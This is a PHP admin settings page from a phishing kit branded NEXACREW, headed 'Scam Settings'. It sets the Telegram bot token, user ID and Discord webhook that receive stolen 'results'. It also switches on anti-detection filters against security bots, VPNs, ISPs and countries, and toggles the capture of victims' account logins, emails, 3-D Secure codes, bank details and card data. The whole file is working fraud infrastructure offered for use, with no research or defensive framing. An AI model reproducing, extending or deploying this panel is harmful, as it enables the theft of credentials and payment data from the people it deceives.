<?php
session_start();
error_reporting(0);
if (!isset($_SESSION['logged_in'])) {
    header('location: login.php');
    die();
}
// Path to the settings configuration file
$settingsFile = "panel.ini";

// Parse the settings from the ini file
$settings = parse_ini_file($settingsFile);

// Check if the form is submitted via POST method
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['save'])) {
    
    // Sanitize and validate form inputs
    $settings['keypanel']       = htmlspecialchars($_POST['KeyPanel']);
    $settings['RESULT']  = htmlspecialchars($_POST['RESULT']);
    $settings['PARAMETER'] = htmlspecialchars($_POST['PARAMETER']);
    
    // Handle checkbox inputs (they are either checked or unchecked)
    $settings['Telegram']  = isset($_POST['Telegram']) ? 'on' : 'off';
    $settings['token']       = htmlspecialchars($_POST['token']);
    $settings['idtelegram']         = htmlspecialchars($_POST['idtelegram']);
    $settings['BLOCKERPRO']        = isset($_POST['BLOCKERPRO']) ? 'on' : 'off';
    $settings['BLOCKERPROKEY']    = htmlspecialchars($_POST['BLOCKERPROKEY']);
    $settings['ANTIBOT']        = isset($_POST['ANTIBOT']) ? 'on' : 'off';
    $settings['ANTIBOTKEY']        = htmlspecialchars($_POST['ANTIBOTKEY']);
    $settings['DISCORD']        = isset($_POST['DISCORD']) ? 'on' : 'off';
    $settings['DISCORD_WEBHOOK']        = htmlspecialchars($_POST['DISCORD_WEBHOOK']);

    // Handle checkbox inputs (they are either checked or unchecked)
    $settings['FILTERISP']  = isset($_POST['FILTERISP']) ? 'on' : 'off';
    $settings['VPNDETECT']      = isset($_POST['VPNDETECT']) ? 'on' : 'off';
    $settings['FILTERCOUNTRY']       = isset($_POST['FILTERCOUNTRY']) ? 'on' : 'off';
    $settings['GETACCOUNT']       = isset($_POST['GETACCOUNT']) ? 'on' : 'off';
    $settings['GETEMAIL']       = isset($_POST['GETEMAIL']) ? 'on' : 'off';
    $settings['GET3DSCURE']       = isset($_POST['GET3DSCURE']) ? 'on' : 'off';
    $settings['GETBANK']       = isset($_POST['GETBANK']) ? 'on' : 'off';
    $settings['GETPAP']       = isset($_POST['GETPAP']) ? 'on' : 'off';
    $settings['DOUBLEEMAIL']       = isset($_POST['DOUBLEEMAIL']) ? 'on' : 'off';
    $settings['DOUBLECARD']       = isset($_POST['DOUBLECARD']) ? 'on' : 'off';

    // Prepare the updated configuration data to write back to the settings.ini file
    $configData = '';
    foreach ($settings as $key => $value) {
        $configData .= "{$key} = \"{$value}\"\n";
    }

    // Save the updated settings back to the settings.ini file
    file_put_contents($settingsFile, $configData);

    // Set success message for SweetAlert
    $_SESSION['message'] = 'Settings updated successfully!';
    $_SESSION['message_type'] = 'success'; // You can use 'error' for error messages
    header("Location: /admin/settings.php");
    exit();
}
?>
<!DOCTYPE html>
<html lang="en" data-layout="vertical" data-topbar="light" data-sidebar="dark" data-sidebar-size="lg" data-sidebar-image="none" data-preloader="disable" data-theme="default" data-theme-colors="default">
<head>
    <meta charset="utf-8" />
    <title>Settings | NEXACREW</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta content="Settings NEXACREW" name="description" />
    <meta content="NEXACREW" name="author" />
    <!-- App favicon -->
    <link rel="shortcut icon" href="assets/img/favicon.ico">
    <!-- Layout config Js -->
    <script src="assets/js/layout.js"></script>
    <!-- Bootstrap Css -->
    <link href="assets/css/bootstrap.min.css" rel="stylesheet" type="text/css" />
    <!-- Icons Css -->
    <link href="assets/css/icons.min.css" rel="stylesheet" type="text/css" />
    <!-- App Css-->
    <link href="assets/css/app.min.css" rel="stylesheet" type="text/css" />
    <!-- custom Css-->
    <link href="assets/css/custom.min.css" rel="stylesheet" type="text/css" />
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.css">
    <!-- Data Tables CSS -->
    <link href="assets/css/dataTables.bootstrap5.css" rel="stylesheet" />
	<link href="assets/css/buttons.bootstrap5.min.css"  rel="stylesheet">
	<link href="assets/css/responsive.bootstrap5.css" rel="stylesheet" />
</head>
<body>
    <div id="layout-wrapper">
        <?php require 'header.php'; ?>
        <?php require 'navbar.php'; ?>
        <!-- Vertical Overlay-->
        <div class="vertical-overlay"></div>
        <!-- ============================================================== -->
        <!-- Start right Content here -->
        <!-- ============================================================== -->
        <div class="main-content">
            <div class="page-content">
                <div class="container-fluid">
                    <div class="row">
                        <div class="col-12">
                            <div class="page-title-box d-sm-flex align-items-center justify-content-between bg-galaxy-transparent">
                                <h4 class="mb-sm-0">Scam Settings</h4>
                                <div class="page-title-right">
                                    <ol class="breadcrumb m-0">
                                        <li class="breadcrumb-item">
                                            <a href="javascript: void(0);">Scam Settings</a>
                                        </li>
                                    </ol>
                                </div>
                            </div>
                        </div>
                    </div>
                    <?php if (isset($_SESSION['message_type'])): ?>
                    <div class="alert alert-success alert-dismissible alert-label-icon rounded-label fade show material-shadow" role="alert">
                        <i class="ri-check-double-line label-icon"></i><strong>Success</strong> - <?= $_SESSION['message']; ?>
                        <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
                    </div>
                    <?php unset($_SESSION['message']); unset($_SESSION['message_type']); ?>
                    <?php endif ?>
                    <form method="POST" action="">
                        <div class="row">
                            <div class="col-sm-6">
                                <div class="card">
                                    <div class="card-body">
                                        <h6>Scam Configuration</h6>
                                        <div class="row mb-3">
                                            <div class="col-lg-3">
                                                <label for="KeyPanel">Key To Login</label>
                                            </div>
                                            <div class="col-lg-9">
                                                <div class="position-relative auth-pass-inputgroup">
                                                    <input type="password" id="password-input" name="KeyPanel" value="<?php echo $settings['keypanel']; ?>" class="form-control pe-5 password-input" required>
                                                    <button class="btn btn-link position-absolute end-0 top-0 text-decoration-none text-muted password-addon material-shadow-none" type="button" id="password-addon"><i class="ri-eye-fill align-middle"></i></button>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="row mb-3">
                                            <div class="col-lg-3">
                                                <label for="PARAMETER">Site Parameter</label>
                                            </div>
                                            <div class="col-lg-9">
                                                <input type="text" id="PARAMETER" name="PARAMETER" placeholder="ex: gladiator" value="<?php echo $settings['PARAMETER']; ?>" class="form-control" required>
                                            </div>
                                        </div>
                                        <div class="row mb-3">
                                            <div class="col-lg-3">
                                                <label for="RESULT">Result</label>
                                            </div>
                                            <div class="col-lg-9">
                                                <input type="text" id="RESULT" name="RESULT" placeholder="ex: gladiator" value="<?php echo $settings['RESULT']; ?>" class="form-control" required>
                                            </div>
                                        </div>
                                        <div class="row mb-3">
                                            <div class="col-lg-3">
                                                <label for="idtelegram">Telegram User ID</label>
                                            </div>
                                            <div class="col-lg-9">
                                                <input type="text" id="idtelegram" name="idtelegram" placeholder="ex: 123456789" value="<?php echo $settings['idtelegram']; ?>" class="form-control" required>
                                            </div>
                                        </div>
                                        <div class="row mb-3">
                                            <div class="col-lg-3">
                                                <label for="token">Telegram API Token</label>
                                            </div>
                                            <div class="col-lg-9">
                                                <input type="text" id="token" name="token" placeholder="ex: gladiator" value="<?php echo $settings['token']; ?>" class="form-control" required>
                                            </div>
                                        </div>
                                        <div class="row mb-3">
                                            <div class="col-lg-3">
                                                <label for="DISCORD_WEBHOOK">Discord Webhook URL</label>
                                            </div>
                                            <div class="col-lg-9">
                                                <input type="text" id="DISCORD_WEBHOOK" name="DISCORD_WEBHOOK" placeholder="Your Discord Webhook URL" value="<?php echo $settings['DISCORD_WEBHOOK']; ?>" class="form-control" <?php if (!(isset($settings['DISCORD']) && $settings['DISCORD'] == 'on')) { echo 'readonly'; } ?>>
                                            </div>
                                        </div>
                                        <hr>
                                        <h6>Result Configuration</h6>
                                        <div class="form-check form-switch d-flex-inline">
                                            <input class="form-check-input" type="checkbox" name="Telegram" id="Telegram"
                                                <?php if (isset($settings['Telegram']) && $settings['Telegram'] == 'on') { echo "checked"; } ?>>
                                            <label class="form-check-label" for="Telegram">
                                                Send Result To Telegram
                                            </label>
                                        </div>
                                        <div class="form-check form-switch d-flex-inline">
                                            <input class="form-check-input" type="checkbox" name="DISCORD" id="DISCORD"
                                                <?php if (isset($settings['DISCORD']) && $settings['DISCORD'] == 'on') { echo "checked"; } ?>>
                                            <label class="form-check-label" for="DISCORD">
                                                Send Result To Discord
                                            </label>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div class="col-sm-6">
                                <div class="card">
                                    <div class="card-body">
                                        <h6>Blocker API Key Configuration</h6>
                                        <div class="row mb-3">
                                            <div class="col-lg-3">
                                                <label for="BLOCKERPROKEY">BLOCKERPRO API Key</label>
                                            </div>
                                            <div class="col-lg-9">
                                                <input type="text" class="form-control" name="BLOCKERPROKEY" value="<?php echo $settings['BLOCKERPROKEY']; ?>" class="form-control" <?php if (!(isset($settings['BLOCKERPRO']) && $settings['BLOCKERPRO'] == 'on')) { echo 'readonly'; } ?>>
                                            </div>
                                        </div>
                                        <div class="row mb-3">
                                            <div class="col-lg-3">
                                                <label for="ANTIBOTKEY">Antibot API Key</label>
                                            </div>
                                            <div class="col-lg-9">
                                                <input type="text" class="form-control" name="ANTIBOTKEY" value="<?php echo $settings['ANTIBOTKEY']; ?>" class="form-control" <?php if (!(isset($settings['ANTIBOT']) && $settings['ANTIBOT'] == 'on')) { echo 'readonly'; } ?>>
                                            </div>
                                        </div>
                                        <hr>
                                        <h6>Blocker Configuration</h6>
                                        <div class="form-check form-switch d-flex-inline">
                                            <input class="form-check-input" type="checkbox" name="BLOCKERPRO" id="BLOCKERPRO"
                                                <?php if (isset($settings['BLOCKERPRO']) && $settings['BLOCKERPRO'] == 'on') { echo "checked"; } ?>>
                                            <label class="form-check-label" for="BLOCKERPRO">
                                                BLOCKERPRO
                                            </label>
                                        </div>
                                        <div class="form-check form-switch d-flex-inline">
                                            <input class="form-check-input" type="checkbox" name="ANTIBOT" id="ANTIBOT"
                                                <?php if (isset($settings['ANTIBOT']) && $settings['ANTIBOT'] == 'on') { echo "checked"; } ?>>
                                            <label class="form-check-label" for="ANTIBOT">
                                                ANTIBOT
                                            </label>
                                        </div>
                                        <div class="form-check form-switch d-flex-inline">
                                            <input class="form-check-input" type="checkbox" name="FILTERISP" id="FILTERISP"
                                                <?php if (isset($settings['FILTERISP']) && $settings['FILTERISP'] == 'on') { echo "checked"; } ?>>
                                            <label class="form-check-label" for="FILTERISP">
                                                FILTERISP
                                            </label>
                                        </div>
                                        <div class="form-check form-switch d-flex-inline">
                                            <input class="form-check-input" type="checkbox" name="VPNDETECT" id="VPNDETECT"
                                                <?php if (isset($settings['VPNDETECT']) && $settings['VPNDETECT'] == 'on') { echo "checked"; } ?>>
                                            <label class="form-check-label" for="VPNDETECT">
                                                VPNDETECT
                                            </label>
                                        </div>
                                        <div class="form-check form-switch d-flex-inline">
                                            <input class="form-check-input" type="checkbox" name="FILTERCOUNTRY" id="FILTERCOUNTRY"
                                                <?php if (isset($settings['FILTERCOUNTRY']) && $settings['FILTERCOUNTRY'] == 'on') { echo "checked"; } ?>>
                                            <label class="form-check-label" for="FILTERCOUNTRY">
                                                FILTERCOUNTRY
                                            </label>
                                        </div>
                                        <hr>
                                        <h6>FEATURE Configuration</h6>
                                        <div class="form-check form-switch d-flex-inline">
                                            <input class="form-check-input" type="checkbox" name="GETACCOUNT" id="GETACCOUNT"
                                                <?php if (isset($settings['GETACCOUNT']) && $settings['GETACCOUNT'] == 'on') { echo "checked"; } ?>>
                                            <label class="form-check-label" for="GETACCOUNT">
                                                GETACCOUNT
                                            </label>
                                        </div>
                                        <div class="form-check form-switch d-flex-inline">
                                            <input class="form-check-input" type="checkbox" name="GETEMAIL" id="GETEMAIL"
                                                <?php if (isset($settings['GETEMAIL']) && $settings['GETEMAIL'] == 'on') { echo "checked"; } ?>>
                                            <label class="form-check-label" for="GETEMAIL">
                                                GETEMAIL
                                            </label>
                                        </div>
                                        <div class="form-check form-switch d-flex-inline">
                                            <input class="form-check-input" type="checkbox" name="GET3DSCURE" id="GET3DSCURE"
                                                <?php if (isset($settings['GET3DSCURE']) && $settings['GET3DSCURE'] == 'on') { echo "checked"; } ?>>
                                            <label class="form-check-label" for="GET3DSCURE">
                                                GET3DSCURE
                                            </label>
                                        </div>
                                        <div class="form-check form-switch d-flex-inline">
                                            <input class="form-check-input" type="checkbox" name="GETBANK" id="GETBANK"
                                                <?php if (isset($settings['GETBANK']) && $settings['GETBANK'] == 'on') { echo "checked"; } ?>>
                                            <label class="form-check-label" for="GETBANK">
                                                GETBANK
                                            </label>
                                        </div>
                                        <div class="form-check form-switch d-flex-inline">
                                            <input class="form-check-input" type="checkbox" name="GETPAP" id="GETPAP"
                                                <?php if (isset($settings['GETPAP']) && $settings['GETPAP'] == 'on') { echo "checked"; } ?>>
                                            <label class="form-check-label" for="GETPAP">
                                                GETPAP
                                            </label>
                                        </div>
                                        <div class="form-check form-switch d-flex-inline">
                                            <input class="form-check-input" type="checkbox" name="DOUBLEEMAIL" id="DOUBLEEMAIL"
                                                <?php if (isset($settings['DOUBLEEMAIL']) && $settings['DOUBLEEMAIL'] == 'on') { echo "checked"; } ?>>
                                            <label class="form-check-label" for="DOUBLEEMAIL">
                                                DOUBLEEMAIL
                                            </label>
                                        </div>
                                        <div class="form-check form-switch d-flex-inline">
                                            <input class="form-check-input" type="checkbox" name="DOUBLECARD" id="DOUBLECARD"
                                                <?php if (isset($settings['DOUBLECARD']) && $settings['DOUBLECARD'] == 'on') { echo "checked"; } ?>>
                                            <label class="form-check-label" for="DOUBLECARD">
                                                DOUBLECARD
                                            </label>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <button type="submit" class="btn btn-outline-primary" name="save">Update Settings</button>
                        <br><br>
                    </form>
                </div>
                <footer class="footer">
                    <div class="container-fluid">
                        <div class="row">
                            <div class="col-sm-6">
                                <script>document.write(new Date().getFullYear())</script> © NEXACREW.
                            </div>
                            <div class="col-sm-6">
                                <div class="text-sm-end d-none d-sm-block">
                                    Design & Develop by NEXACREW
                                </div>
                            </div>
                        </div>
                    </div>
                </footer>
            </div>
            <!-- end main content-->
        </div>
        <!-- END layout-wrapper -->
        <?php require 'footer.php'; ?>
        <!-- JAVASCRIPT -->
        <script src="assets/js/simplebar.min.js"></script>
        <script src="assets/js/waves.min.js"></script>
        <script src="assets/js/feather.min.js"></script>
        <script src="assets/js/lord-icon-2.1.0.js"></script>
        <script src="assets/js/plugins.js"></script>
        <script src="assets/js/jquery-3.6.0.min.js"></script>
        <!-- Data tables -->
        <script src="assets/js/jquery.dataTables.min.js"></script>
    	<script src="assets/js/dataTables.bootstrap5.js"></script>
    	<script src="assets/js/dataTables.responsive.min.js"></script>
    	<script src="assets/js/table-data.js"></script>
        <!-- Dashboard init -->
        <script src="assets/js/dashboard-analytics.init.js"></script>
        <!-- password-addon init -->
        <script src="assets/js/password-addon.init.js"></script>
        <!-- App js -->
        <script src="assets/js/app.js"></script>
        <script src="assets/js/functions.js"></script>
        <!-- Bootstrap JS (Make sure to include Popper.js for Bootstrap components to work) -->
        <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.js"></script>
    </body>
</html>